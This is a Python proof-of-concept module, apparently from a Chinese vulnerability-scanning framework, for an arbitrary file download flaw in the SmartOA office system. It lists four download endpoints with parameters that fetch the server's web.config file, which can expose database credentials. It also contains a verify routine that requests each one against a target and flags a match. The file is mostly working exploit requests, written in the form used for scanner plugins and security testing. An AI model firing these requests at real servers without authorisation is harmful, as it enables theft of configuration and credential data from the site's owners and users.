# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'SmartOA_0001' # 平台漏洞编号，留空
    name = 'SmartOA系统 任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-08-11'  # 漏洞公布时间
    desc = '''
        力智软件SmartOA协同办公系统存在多个任意文件下载漏洞（泄漏数据库相关信息）。
        "/file/EmailDownload.ashx?url=~/web.config&name=web.config",
        "/file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
        "/file/DownLoad.ashx?path=~/web.config",
        "/file/MyDownLoad.ashx?path=~/web.config"
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=060613
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'SmartOA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1b441e49-fdbc-412c-a9cc-1fa3c2a2afc7'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps=[
                "/file/EmailDownload.ashx?url=~/web.config&name=web.config",
                "/file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
                "/file/DownLoad.ashx?path=~/web.config",
                "/file/MyDownLoad.ashx?path=~/web.config"
                ]
            for p in ps:
                url=arg+p
                code,head,res,errcode,_=hh.http(url)
                if code==200 and "<configuration>" in res and '<appSettings>' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()